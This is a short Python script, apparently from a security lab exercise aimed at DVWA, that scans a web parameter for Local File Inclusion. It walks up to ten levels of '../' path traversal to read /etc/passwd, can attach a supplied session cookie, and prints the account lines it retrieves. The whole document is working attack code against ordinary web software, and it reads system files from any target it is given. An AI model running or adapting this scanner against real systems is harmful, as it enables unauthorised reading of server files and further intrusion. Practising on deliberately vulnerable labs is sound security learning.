# Scans for Local File Inclusion vulnerabilities
# COOKIE CAN BE FOUND IN > DEVTOOLS > Headers
# We Specify Cookie first then test
# for a LFI vulnerability

import requests
import sys

#WE MUST PROCESS THIS LINE AND JUST GRAB COOKIE
# security=low; PHPSESSID=  {cookie is on same line}

# cookie is a string, it must be JSON
def process_str(cookie_str):
    cookie_dict = {}
    for each in cookie_str.split(";"):
        cookie_dict[each.split('=')[0].strip()] = each.split('=')[1].strip()
    return cookie_dict


# we go up in directory till it hits, max 10

def main(base_url, parameter_name, cookie_str):

    up = '../'
    for i in range(0, 10):
        if i == 0:
            url = "%s?%s=" %(base_url, parameter_name) + '/etc/passwd'
        else:
            url = "%s?%s=" %(base_url, parameter_name) + i * up + 'etc/passwd'
        #print(url)

        # Conditional
        if not cookie_str:
            response = requests.get(url)
        else:
            response = requests.get(url, cookies=process_str(cookie_str))
        #print(response.text)

        if response.status_code == 200:
            if 'root' in response.text:
                print("[-] LFI Vulnerability exists on target")
                print(url)
                for line in response.text.split():
                    if ":x:" in line:
                        print(line.strip())


if __name__ == '__main__':
    try:
        base_url = sys.argv[1]
        parameter_name = sys.argv[2]
        if len(sys.argv) > 3:
            cookie_str = sys.argv[3]
        else:
            cookie_str = None
        main(base_url, parameter_name, cookie_str)

    except IndexError:
        print("[-]Usage: %s <base_url> <parameter name> <cookie>" % sys.argv[0])
        print("[-]Example: %s http://192.168.155.131/dvwa/vunerabilities/lfi page cookiexxxx" % sys.argv[0] )
        sys.exit()


